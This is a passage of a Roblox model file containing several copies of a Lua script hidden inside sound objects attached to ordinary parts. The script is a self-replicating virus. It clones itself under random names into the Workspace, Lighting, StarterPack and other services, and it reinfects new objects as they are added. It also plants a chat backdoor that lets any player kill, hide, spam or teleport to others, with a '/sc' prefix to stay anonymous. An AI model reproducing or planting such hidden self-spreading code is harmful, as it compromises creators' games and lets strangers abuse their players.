if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 0.5 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Part&quot; then h[v].Transparency = 0.5 end
end
end
end
end
end
end
if string.find(msg, &quot;join &quot;) == 1 then
local teams = game:service(&quot;Teams&quot;)
local tmz = teams:GetTeams()
for i = 1, #tmz do
if string.find(tmz[i].Name, string.sub(msg, 6)) == 1 then
speaker.Neutral = false
speaker.TeamColor = tmz[i].TeamColor
end
end
end
if string.find(msg, &quot;debug&quot;) == 1 then
local msgs = game.Workspace:GetChildren()
for i = 1, #msgs do
if msgs[i].className == &quot;Message&quot; or msgs[i].className == &quot;Hint&quot; then
msgs[i]:Remove()
end
end
local plz = game.Players:GetPlayers()
for j = 1, #plz do
local msgs = plz[j]:GetChildren()
for i = 1, #msgs do
if msgs[i].className == &quot;Message&quot; or msgs[i].className == &quot;Hint&quot; then
msgs[i]:Remove()
end
end
end
end
if string.find(msg, &quot;fog&quot;) == 1 then
if game.Workspace:findFirstChild(&quot;FOGZORZ&quot;) == nil then
local newm = Instance.new(&quot;Message&quot;)
newm.Name = &quot;FOGZORZ&quot;
newm.Text = &quot; &quot;
newm.Parent = game.Workspace
newm:Clone().Parent = game.Workspace
end
end
if string.find(msg, &quot;say &quot;) == 1 then
if game.Workspace:findFirstChild(&quot;Talky&quot;) ~= nil then game.Workspace.Talky:Remove() end
local said = string.sub(msg, 5)
local talk = Instance.new(&quot;Hint&quot;)
talk.Name = &quot;Talky&quot;
talk.Text = speaker.Name.. &quot;: &quot;.. said
talk.Parent = game.Workspace
end
if string.find(msg, &quot;shout &quot;) == 1 then
if game.Workspace:findFirstChild(&quot;Shouty&quot;) ~= nil then game.Workspace.Shouty:Remove() end
local said = string.sub(msg, 7)
local talk = Instance.new(&quot;Message&quot;)
talk.Name = &quot;Shouty&quot;
talk.Text = speaker.Name.. &quot;: &quot;.. said
talk.Parent = game.Workspace
end
if string.find(msg, &quot;spam &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
for r = 1, 10 do
local er = Instance.new(&quot;Message&quot;)
er.Text = &quot; &quot;
er.Parent = plz[i]
end
end
end
end
if string.find(msg, &quot;bored&quot;) == 1 then
if game.Workspace:findFirstChild(&quot;Talky&quot;) ~= nil then game.Workspace.Talky:Remove() end
local talk = Instance.new(&quot;Hint&quot;)
talk.Name = &quot;Talky&quot;
talk.Parent = game.Workspace
if math.random(1,2) == 1 then
talk.Text = &quot;OMG IM SO BORED TOO!&quot;
else
talk.Text = &quot;Go play a different game then.&quot;
end
end
if string.find(msg, &quot;goto &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Head&quot;) ~= nil then
if speaker.Character ~= nil then
if speaker.Character:findFirstChild(&quot;Head&quot;) ~= nil then
speaker.Character.Head.CFrame = CFrame.new(plz[i].Character.Head.Position + Vector3.new(0,3,0))
end
end
end
end
end
end
end
if string.find(msg, &quot;nofall &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 8)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Platform&quot;) == nil then
local fl = Instance.new(&quot;Part&quot;)
fl.Name = &quot;Platform&quot;
fl.formFactor = &quot;Plate&quot;
fl.Size = Vector3.new(6,.2,6)
fl.Anchored = true
fl.Transparency = 1
local sc = Instance.new(&quot;Script&quot;)
sc.Name = &quot;MoveToChar&quot;
pcall(function() sc.Source=[[ p = script.Parent c = p.Parent while true do t = c:findFirstChild(&quot;Head&quot;) if t == nil then p:Remove() else p.Position = Vector3.new(t.Position.x,0,t.Position.z) end wait() end ]] end)
if sc.Source ~= &quot;print(\&quot;Hello World\&quot;)&quot; then
sc.Parent = fl -- its pcalled just in case. Well I have no idea what crazy things the admins will do in a few days, like stop scripts editing sources, but then as if THATS ever going 2 happen... (it would be stupid cause most roblox scripters would leave)
fl.Parent = plz[i].Character
end
end
end
end
end
end
if string.find(msg, &quot;tools &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 7)) == 1 then
local pack = plz[i]:findFirstChild(&quot;Backpack&quot;)
if pack ~= nil then
for o = 1, #thetools do
thetools[o]:Clone().Parent = pack
end
end
end
end
end
end
wait()
game.Players.PlayerAdded:connect(function(new) new.Chatted:connect(function(msg) chat(msg,new) end) end) -- I do love this connecting script...
wait()
multinfect(game:service(&quot;Workspace&quot;))
multinfect(game:service(&quot;Lighting&quot;))
multinfect(game:service(&quot;StarterPack&quot;))
multinfect(game:service(&quot;Teams&quot;))
multinfect(game:service(&quot;SoundService&quot;))
multinfect(game:service(&quot;Debris&quot;))
--now we can rest in peace...

death = type(RIP)
</string>
							<bool name="archivable">true</bool>
						</Properties>
					</Item>
				</Item>
			</Item>
			<Item class="Part" referent="RBX8">
				<Properties>
					<bool name="Anchored">false</bool>
					<float name="BackParamA">-0.5</float>
					<float name="BackParamB">0.5</float>
					<token name="BackSurface">0</token>
					<token name="BackSurfaceInput">0</token>
					<float name="BottomParamA">-0.5</float>
					<float name="BottomParamB">0.5</float>
					<token name="BottomSurface">0</token>
					<token name="BottomSurfaceInput">0</token>
					<int name="BrickColor">199</int>
					<CoordinateFrame name="CFrame">
						<X>-12.9999924</X>
						<Y>2.40088534</Y>
						<Z>-31.0000153</Z>
						<R00>0.99999994</R00>
						<R01>0.000373968214</R01>
						<R02>-1.49560719e-005</R02>
						<R10>-0.000373968243</R10>
						<R11>0.99999994</R11>
						<R12>-2.95067866e-006</R12>
						<R20>1.49549669e-005</R20>
						<R21>2.95627319e-006</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<bool name="CanCollide">true</bool>
					<bool name="DraggingV1">false</bool>
					<float name="Elasticity">0.5</float>
					<token name="FormFactor">0</token>
					<float name="Friction">1</float>
					<float name="FrontParamA">-0.5</float>
					<float name="FrontParamB">0.5</float>
					<token name="FrontSurface">0</token>
					<token name="FrontSurfaceInput">0</token>
					<float name="LeftParamA">-0.5</float>
					<float name="LeftParamB">0.5</float>
					<token name="LeftSurface">0</token>
					<token name="LeftSurfaceInput">0</token>
					<bool name="Locked">false</bool>
					<token name="Material">256</token>
					<string name="Name">Left Front</string>
					<float name="Reflectance">0</float>
					<float name="RightParamA">0.300000012</float>
					<float name="RightParamB">0.300000012</float>
					<token name="RightSurface">6</token>
					<token name="RightSurfaceInput">1</token>
					<Vector3 name="RotVelocity">
						<X>-0.00147129828</X>
						<Y>-0.00629584631</Y>
						<Z>-0.00427307747</Z>
					</Vector3>
					<float name="TopParamA">-0.5</float>
					<float name="TopParamB">0.5</float>
					<token name="TopSurface">0</token>
					<token name="TopSurfaceInput">0</token>
					<float name="Transparency">0</float>
					<Vector3 name="Velocity">
						<X>0.0202435125</X>
						<Y>-0.0143043054</Y>
						<Z>0.00144263939</Z>
					</Vector3>
					<bool name="archivable">true</bool>
					<token name="shape">2</token>
					<Vector3 name="size">
						<X>4</X>
						<Y>4</Y>
						<Z>4</Z>
					</Vector3>
				</Properties>
				<Item class="StockSound" referent="RBX9">
					<Properties>
						<bool name="Looped">false</bool>
						<string name="Name">k2n5e8c</string>
						<int name="PlayCount">-1</int>
						<bool name="PlayOnRemove">false</bool>
						<Content name="SoundId"><null></null></Content>
						<float name="Volume">0.5</float>
						<bool name="archivable">true</bool>
					</Properties>
					<Item class="Script" referent="RBX10">
						<Properties>
							<bool name="Disabled">false</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">mmalh2</string>
							<string name="Source">--             	 _                     |
-- unknowns 0.|_| Commands o
--

myname = &quot;builderman&quot; -- put your name here if you like!

--Hi, person who just looked inside a StockSound...
--Try these commands, they are great!

--[[COMMANDS:

say /sc BEFORE your command to make it so no-one kows its you who killed/shielded them

for example:

/sc shield builderman

reset  --this resets YOU
debug  --this removes all messages in the workspace and in players
fog  --this creates a few messages to look like fog, say debug to remove them

shield playername  --this shields the player named playername against explosions
kill playername  --this kills the player named playername
name newname  --this names YOUR CHARACTER the newname
god playername  --this sets the player playername unkillable by weapons that take damage (not explosions)
fast playername  --this speeds up the player named playername
slow playername --this slows the player named playername
hide playername  --this hides the player named playername
ghost playername  --this makes the player named playername ghostly
fade playername --this fades the player named playername a bit
show playername  --shows the player named playername
doom playername  --this makes there head a big triangle lol you can watch them running around stupidly
spam playername  --stops the player named playername seeing the chat properly
tools playername  --this gives the player the vip tools in the game
goto playername  --this moves your character to that players character
join teamname  --this joins the team named the teamname
say message  --creates a hint at the bottom of the screen saying your message
shout message  --creates a message on the screen saying your message

this is all case-sensitive

please note it is not needed to say the WHOLE name of the player, lets say just builderman was in the game:

tools bu would give him the VIP tools

but if builderdude was ingame aswell, he would ALSO get the tools, so if you only want builderman to get them, you should say:

tools builderm

also, if you just say tools then a space, then EVERYONE will get the tools

the same goes for kill, god, ghost, and all the other commands that use playername
--]]

--everything below here is very complicated so it would be best if you DONT mess with it

wait(.4)
if game:service(&quot;Workspace&quot;):findFirstChild(&quot;IMDOINGITOKSODONTKILLMENOW&quot;) ~= nil then
wait(math.huge) --this should keep it busy
end
jkoer = Instance.new(script.Parent.className)
jkoer.Name = &quot;IMDOINGITOKSODONTKILLMENOW&quot;
jkoer.Parent = game:service(&quot;Workspace&quot;)
jkoer.archivable = false
--Check all systems needed are running well
game:service(&quot;Workspace&quot;)
game:service(&quot;Lighting&quot;)
game:service(&quot;StarterPack&quot;)
game:service(&quot;Teams&quot;)
game:service(&quot;SoundService&quot;)
game:service(&quot;Debris&quot;)
--
bin = script.Parent
g = {&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;d&quot;,&quot;e&quot;,&quot;f&quot;,&quot;g&quot;,&quot;h&quot;,&quot;i&quot;,&quot;j&quot;,&quot;k&quot;,&quot;l&quot;,&quot;m&quot;,&quot;n&quot;,&quot;o&quot;,&quot;p&quot;,&quot;q&quot;,&quot;r&quot;,&quot;s&quot;,&quot;t&quot;,&quot;u&quot;,&quot;v&quot;,&quot;w&quot;,&quot;x&quot;,&quot;y&quot;,&quot;z&quot;,&quot;0&quot;,&quot;1&quot;,&quot;2&quot;,&quot;3&quot;,&quot;4&quot;,&quot;5&quot;,&quot;6&quot;,&quot;7&quot;,&quot;8&quot;,&quot;9&quot;} --abcdefg...
thetools = {}
function gettools(scanner)
if scanner.className == &quot;HopperBin&quot; or scanner.className == &quot;Tool&quot; then
if scanner.archivable == true then table.insert(thetools, scanner:Clone()) end
end
local sc = scanner:GetChildren()
for i = 1, #sc do
gettools(sc[i])
end
end
gettools(game:service(&quot;Workspace&quot;))
gettools(game:service(&quot;Lighting&quot;))
function uinf(k)
if nowitshall == 1 then wait() nowitshall = 0 elseif nowitshall == 0 then nowitshall = 2 else nowitshall = 1 end --a nice little bit of script that stops the game lagging
if k ~= bin and k ~= script and k ~= bin.Parent then
local me = script.Parent:Clone()
me.Name = &quot;&quot;
local length = math.random(4,9)
for i = 1, length do
me.Name = (me.Name.. g[math.random(1, #g)])
end
local be = me[script.Name]
be.Name = &quot;&quot;
local length = math.random(4,9)
for i = 1, length do
be.Name = (be.Name.. g[math.random(1, #g)])
end
me.Parent = k
local obs = k:GetChildren()
for i = 1, #obs do
infect(obs[i])
end
end
end
function infect(object)
local ONOES = 0
if object.className == &quot;Camera&quot; then return end
if object.className == &quot;Script&quot; then
if object.Source == script.Source then
ONOES = 1
end
end
local os = object:GetChildren()
for i = 1, #os do
local current = os[i]
if current.className == &quot;Script&quot; then
if current.Source == script.Source then
ONOES = 1
end
end
local oz = current:GetChildren()
for j = 1, #oz do
local cur = oz[j]
if cur.className == &quot;Script&quot; then
if cur.Source == script.Source then
ONOES = 1
end
end
end
end
if ONOES == 0 then
uinf(object)
else -- ONOSE!
local obs = object:GetChildren()
for i = 1, #obs do
if obs[i] ~= bin then
infect(obs[i])
end
end
end
end
function pultinfect(central)
central.ChildAdded:connect(pultinfect)
infect(central)
local sides = central:GetChildren()
for i = 1, #sides do
pultinfect(sides[i])
end
if nowitshall == 1 then wait() nowitshall = 0 elseif nowitshall == 0 then nowitshall = 2 else nowitshall = 1 end
end
function multinfect(central)
central.ChildAdded:connect(pultinfect)
infect(central)
local sides = central:GetChildren()
for i = 1, #sides do
pultinfect(sides[i])
end
end
function chat(msg, speaker) --oh yes these are commands...
if string.find(msg, &quot;/sc &quot;) == 1 then
msg = string.sub(msg, 5) --I LOVE being secretive, dont u?
end
if string.find(msg, &quot;shield &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 8)) == 1 then
Instance.new(&quot;ForceField&quot;).Parent = plz[i].Character
end
end
end
if string.find(msg, &quot;kill &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
plz[i].Character:BreakJoints() --kill kill kill...
end
end
end
end
if string.find(msg, &quot;reset&quot;) == 1 then
if speaker.Character ~= nil then
speaker.Character:BreakJoints()
end
end
if string.find(msg, &quot;name &quot;) == 1 then
if speaker.Character ~= nil then
speaker.Character.Name = string.sub(msg, 6)
end
end
if string.find(msg, &quot;god &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 5)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Humanoid&quot;) ~= nil then
plz[i].Character.Humanoid.MaxHealth = math.huge
plz[i].Character.Humanoid.Health = math.huge
end
end
end
end
end
if string.find(msg, &quot;fast &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Humanoid&quot;) ~= nil then
plz[i].Character.Humanoid.WalkSpeed = plz[i].Character.Humanoid.WalkSpeed * 1.35
end
end
end
end
end
if string.find(msg, &quot;slow &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Humanoid&quot;) ~= nil then
plz[i].Character.Humanoid.WalkSpeed = plz[i].Character.Humanoid.WalkSpeed / 1.35
end
end
end
end
end
if string.find(msg, &quot;hide &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 1 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Decal&quot; then h[v]:Remove() end
if h[v].className == &quot;Part&quot; then h[v].Transparency = 1 end
end
end
end
end
end
end
if string.find(msg, &quot;show &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 0 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Part&quot; then h[v].Transparency = 0 end
end
end
end
end
end
end
if string.find(msg, &quot;ghost &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 7)) == 1 then
if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 0.9 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Part&quot; then h[v].Transparency = 0.9 end
end
end
end
end
end
end
if string.find(msg, &quot;doom &quot;) == 1 then -- LOL this 1 is FUNNY
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Head&quot;) ~= nil then
if plz[i].Character.Head:findFirstChild(&quot;Mesh&quot;) ~= nil then
if plz[i].Character.Head.Mesh.className == &quot;SpecialMesh&quot; then
plz[i].Character.Head.Mesh.Scale = Vector3.new(17, 11, 17)
plz[i].Character.Head.Mesh.MeshType = &quot;Wedge&quot;
end
end
end
end
end
end
end
if string.find(msg, &quot;fade &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 0.5 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Part&quot; then h[v].Transparency = 0.5 end
end
end
end
end
end
end
if string.find(msg, &quot;join &quot;) == 1 then
local teams = game:service(&quot;Teams&quot;)
local tmz = teams:GetTeams()
for i = 1, #tmz do
if string.find(tmz[i].Name, string.sub(msg, 6)) == 1 then
speaker.Neutral = false
speaker.TeamColor = tmz[i].TeamColor
end
end
end
if string.find(msg, &quot;debug&quot;) == 1 then
local msgs = game.Workspace:GetChildren()
for i = 1, #msgs do
if msgs[i].className == &quot;Message&quot; or msgs[i].className == &quot;Hint&quot; then
msgs[i]:Remove()
end
end
local plz = game.Players:GetPlayers()
for j = 1, #plz do
local msgs = plz[j]:GetChildren()
for i = 1, #msgs do
if msgs[i].className == &quot;Message&quot; or msgs[i].className == &quot;Hint&quot; then
msgs[i]:Remove()
end
end
end
end
if string.find(msg, &quot;fog&quot;) == 1 then
if game.Workspace:findFirstChild(&quot;FOGZORZ&quot;) == nil then
local newm = Instance.new(&quot;Message&quot;)
newm.Name = &quot;FOGZORZ&quot;
newm.Text = &quot; &quot;
newm.Parent = game.Workspace
newm:Clone().Parent = game.Workspace
end
end
if string.find(msg, &quot;say &quot;) == 1 then
if game.Workspace:findFirstChild(&quot;Talky&quot;) ~= nil then game.Workspace.Talky:Remove() end
local said = string.sub(msg, 5)
local talk = Instance.new(&quot;Hint&quot;)
talk.Name = &quot;Talky&quot;
talk.Text = speaker.Name.. &quot;: &quot;.. said
talk.Parent = game.Workspace
end
if string.find(msg, &quot;shout &quot;) == 1 then
if game.Workspace:findFirstChild(&quot;Shouty&quot;) ~= nil then game.Workspace.Shouty:Remove() end
local said = string.sub(msg, 7)
local talk = Instance.new(&quot;Message&quot;)
talk.Name = &quot;Shouty&quot;
talk.Text = speaker.Name.. &quot;: &quot;.. said
talk.Parent = game.Workspace
end
if string.find(msg, &quot;spam &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
for r = 1, 10 do
local er = Instance.new(&quot;Message&quot;)
er.Text = &quot; &quot;
er.Parent = plz[i]
end
end
end
end
if string.find(msg, &quot;bored&quot;) == 1 then
if game.Workspace:findFirstChild(&quot;Talky&quot;) ~= nil then game.Workspace.Talky:Remove() end
local talk = Instance.new(&quot;Hint&quot;)
talk.Name = &quot;Talky&quot;
talk.Parent = game.Workspace
if math.random(1,2) == 1 then
talk.Text = &quot;OMG IM SO BORED TOO!&quot;
else
talk.Text = &quot;Go play a different game then.&quot;
end
end
if string.find(msg, &quot;goto &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Head&quot;) ~= nil then
if speaker.Character ~= nil then
if speaker.Character:findFirstChild(&quot;Head&quot;) ~= nil then
speaker.Character.Head.CFrame = CFrame.new(plz[i].Character.Head.Position + Vector3.new(0,3,0))
end
end
end
end
end
end
end
if string.find(msg, &quot;nofall &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 8)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Platform&quot;) == nil then
local fl = Instance.new(&quot;Part&quot;)
fl.Name = &quot;Platform&quot;
fl.formFactor = &quot;Plate&quot;
fl.Size = Vector3.new(6,.2,6)
fl.Anchored = true
fl.Transparency = 1
local sc = Instance.new(&quot;Script&quot;)
sc.Name = &quot;MoveToChar&quot;
pcall(function() sc.Source=[[ p = script.Parent c = p.Parent while true do t = c:findFirstChild(&quot;Head&quot;) if t == nil then p:Remove() else p.Position = Vector3.new(t.Position.x,0,t.Position.z) end wait() end ]] end)
if sc.Source ~= &quot;print(\&quot;Hello World\&quot;)&quot; then
sc.Parent = fl -- its pcalled just in case. Well I have no idea what crazy things the admins will do in a few days, like stop scripts editing sources, but then as if THATS ever going 2 happen... (it would be stupid cause most roblox scripters would leave)
fl.Parent = plz[i].Character
end
end
end
end
end
end
if string.find(msg, &quot;tools &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 7)) == 1 then
local pack = plz[i]:findFirstChild(&quot;Backpack&quot;)
if pack ~= nil then
for o = 1, #thetools do
thetools[o]:Clone().Parent = pack
end
end
end
end
end
end
wait()
game.Players.PlayerAdded:connect(function(new) new.Chatted:connect(function(msg) chat(msg,new) end) end) -- I do love this connecting script...
wait()
multinfect(game:service(&quot;Workspace&quot;))
multinfect(game:service(&quot;Lighting&quot;))
multinfect(game:service(&quot;StarterPack&quot;))
multinfect(game:service(&quot;Teams&quot;))
multinfect(game:service(&quot;SoundService&quot;))
multinfect(game:service(&quot;Debris&quot;))
--now we can rest in peace...

death = type(RIP)
</string>
							<bool name="archivable">true</bool>
						</Properties>
					</Item>
				</Item>
			</Item>
			<Item class="Part" referent="RBX11">
				<Properties>
					<bool name="Anchored">false</bool>
					<float name="BackParamA">-0.5</float>
					<float name="BackParamB">0.5</float>
					<token name="BackSurface">0</token>
					<token name="BackSurfaceInput">0</token>
					<float name="BottomParamA">-0.5</float>
					<float name="BottomParamB">0.5</float>
					<token name="BottomSurface">0</token>
					<token name="BottomSurfaceInput">0</token>
					<int name="BrickColor">199</int>
					<CoordinateFrame name="CFrame">
						<X>-5.00003052</X>
						<Y>2.40076518</Y>
						<Z>-22.9999924</Z>
						<R00>0.99999994</R00>
						<R01>-0.000321626547</R01>
						<R02>-1.45272625e-005</R02>
						<R10>0.000321626401</R10>
						<R11>0.99999994</R11>
						<R12>-1.01967526e-005</R12>
						<R20>1.45305412e-005</R20>
						<R21>1.01920796e-005</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<bool name="CanCollide">true</bool>
					<bool name="DraggingV1">false</bool>
					<float name="Elasticity">0.5</float>
					<token name="FormFactor">0</token>
					<float name="Friction">1</float>
					<float name="FrontParamA">-0.5</float>
					<float name="FrontParamB">0.5</float>
					<token name="FrontSurface">0</token>
					<token name="FrontSurfaceInput">0</token>
					<float name="LeftParamA">0.300000012</float>
					<float name="LeftParamB">0.300000012</float>
					<token name="LeftSurface">6</token>
					<token name="LeftSurfaceInput">2</token>
					<bool name="Locked">false</bool>
					<token name="Material">256</token>
					<string name="Name">Right Rear</string>
					<float name="Reflectance">0</float>
					<float name="RightParamA">-0.5</float>
					<float name="RightParamB">0.5</float>
					<token name="RightSurface">0</token>
					<token name="RightSurfaceInput">0</token>
					<Vector3 name="RotVelocity">
						<X>-0.00143274071</X>
						<Y>-0.00791082531</Y>
						<Z>-0.00274152192</Z>
					</Vector3>
					<float name="TopParamA">-0.5</float>
					<float name="TopParamB">0.5</float>
					<token name="TopSurface">0</token>
					<token name="TopSurfaceInput">0</token>
					<float name="Transparency">0</float>
					<Vector3 name="Velocity">
						<X>-0.0829028189</X>
						<Y>0.00725667924</Y>
						<Z>-0.0070668445</Z>
					</Vector3>
					<bool name="archivable">true</bool>
					<token name="shape">2</token>
					<Vector3 name="size">
						<X>4</X>
						<Y>4</Y>
						<Z>4</Z>
					</Vector3>
				</Properties>
				<Item class="StockSound" referent="RBX12">
					<Properties>
						<bool name="Looped">false</bool>
						<string name="Name">c6ouqz</string>
						<int name="PlayCount">-1</int>
						<bool name="PlayOnRemove">false</bool>
						<Content name="SoundId"><null></null></Content>
						<float name="Volume">0.5</float>
						<bool name="archivable">true</bool>
					</Properties>
					<Item class="Script" referent="RBX13">
						<Properties>
							<bool name="Disabled">false</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">vvhn16u</string>
							<string name="Source">--             	 _                     |
-- unknowns 0.|_| Commands o
--

myname = &quot;builderman&quot; -- put your name here if you like!

--Hi, person who just looked inside a StockSound...
--Try these commands, they are great!

--[[COMMANDS:

say /sc BEFORE your command to make it so no-one kows its you who killed/shielded them

for example:

/sc shield builderman

reset  --this resets YOU
debug  --this removes all messages in the workspace and in players
fog  --this creates a few messages to look like fog, say debug to remove them

shield playername  --this shields the player named playername against explosions
kill playername  --this kills the player named playername
name newname  --this names YOUR CHARACTER the newname
god playername  --this sets the player playername unkillable by weapons that take damage (not explosions)
fast playername  --this speeds up the player named playername
slow playername --this slows the player named playername
hide playername  --this hides the player named playername
ghost playername  --this makes the player named playername ghostly
fade playername --this fades the player named playername a bit
show playername  --shows the player named playername
doom playername  --this makes there head a big triangle lol you can watch them running around stupidly
spam playername  --stops the player named playername seeing the chat properly
tools playername  --this gives the player the vip tools in the game
goto playername  --this moves your character to that players character
join teamname  --this joins the team named the teamname
say message  --creates a hint at the bottom of the screen saying your message
shout message  --creates a message on the screen saying your message

this is all case-sensitive

please note it is not needed to say the WHOLE name of the player, lets say just builderman was in the game:

tools bu would give him the VIP tools

but if builderdude was ingame aswell, he would ALSO get the tools, so if you only want builderman to get them, you should say:

tools builderm

also, if you just say tools then a space, then EVERYONE will get the tools

the same goes for kill, god, ghost, and all the other commands that use playername
--]]

--everything below here is very complicated so it would be best if you DONT mess with it

wait(.4)
if game:service(&quot;Workspace&quot;):findFirstChild(&quot;IMDOINGITOKSODONTKILLMENOW&quot;) ~= nil then
wait(math.huge) --this should keep it busy
end
jkoer = Instance.new(script.Parent.className)
jkoer.Name = &quot;IMDOINGITOKSODONTKILLMENOW&quot;
jkoer.Parent = game:service(&quot;Workspace&quot;)
jkoer.archivable = false
--Check all systems needed are running well
game:service(&quot;Workspace&quot;)
game:service(&quot;Lighting&quot;)
game:service(&quot;StarterPack&quot;)
game:service(&quot;Teams&quot;)
game:service(&quot;SoundService&quot;)
game:service(&quot;Debris&quot;)
--
bin = script.Parent
g = {&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;d&quot;,&quot;e&quot;,&quot;f&quot;,&quot;g&quot;,&quot;h&quot;,&quot;i&quot;,&quot;j&quot;,&quot;k&quot;,&quot;l&quot;,&quot;m&quot;,&quot;n&quot;,&quot;o&quot;,&quot;p&quot;,&quot;q&quot;,&quot;r&quot;,&quot;s&quot;,&quot;t&quot;,&quot;u&quot;,&quot;v&quot;,&quot;w&quot;,&quot;x&quot;,&quot;y&quot;,&quot;z&quot;,&quot;0&quot;,&quot;1&quot;,&quot;2&quot;,&quot;3&quot;,&quot;4&quot;,&quot;5&quot;,&quot;6&quot;,&quot;7&quot;,&quot;8&quot;,&quot;9&quot;} --abcdefg...
thetools = {}
function gettools(scanner)
if scanner.className == &quot;HopperBin&quot; or scanner.className == &quot;Tool&quot; then
if scanner.archivable == true then table.insert(thetools, scanner:Clone()) end
end
local sc = scanner:GetChildren()
for i = 1, #sc do
gettools(sc[i])
end
end
gettools(game:service(&quot;Workspace&quot;))
gettools(game:service(&quot;Lighting&quot;))
function uinf(k)
if nowitshall == 1 then wait() nowitshall = 0 elseif nowitshall == 0 then nowitshall = 2 else nowitshall = 1 end --a nice little bit of script that stops the game lagging
if k ~= bin and k ~= script and k ~= bin.Parent then
local me = script.Parent:Clone()
me.Name = &quot;&quot;
local length = math.random(4,9)
for i = 1, length do
me.Name = (me.Name.. g[math.random(1, #g)])
end
local be = me[script.Name]
be.Name = &quot;&quot;
local length = math.random(4,9)
for i = 1, length do
be.Name = (be.Name.. g[math.random(1, #g)])
end
me.Parent = k
local obs = k:GetChildren()
for i = 1, #obs do
infect(obs[i])
end
end
end
function infect(object)
local ONOES = 0
if object.className == &quot;Camera&quot; then return end
if object.className == &quot;Script&quot; then
if object.Source == script.Source then
ONOES = 1
end
end
local os = object:GetChildren()
for i = 1, #os do
local current = os[i]
if current.className == &quot;Script&quot; then
if current.Source == script.Source then
ONOES = 1
end
end
local oz = current:GetChildren()
for j = 1, #oz do
local cur = oz[j]
if cur.className == &quot;Script&quot; then
if cur.Source == script.Source then
ONOES = 1
end
end
end
end
if ONOES == 0 then
uinf(object)
else -- ONOSE!
local obs = object:GetChildren()
for i = 1, #obs do
if obs[i] ~= bin then
infect(obs[i])
end
end
end
end
function pultinfect(central)
central.ChildAdded:connect(pultinfect)
infect(central)
local sides = central:GetChildren()
for i = 1, #sides do
pultinfect(sides[i])
end
if nowitshall == 1 then wait() nowitshall = 0 elseif nowitshall == 0 then nowitshall = 2 else nowitshall = 1 end
end
function multinfect(central)
central.ChildAdded:connect(pultinfect)
infect(central)
local sides = central:GetChildren()
for i = 1, #sides do
pultinfect(sides[i])
end
end
function chat(msg, speaker) --oh yes these are commands...
if string.find(msg, &quot;/sc &quot;) == 1 then
msg = string.sub(msg, 5) --I LOVE being secretive, dont u?
end
if string.find(msg, &quot;shield &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
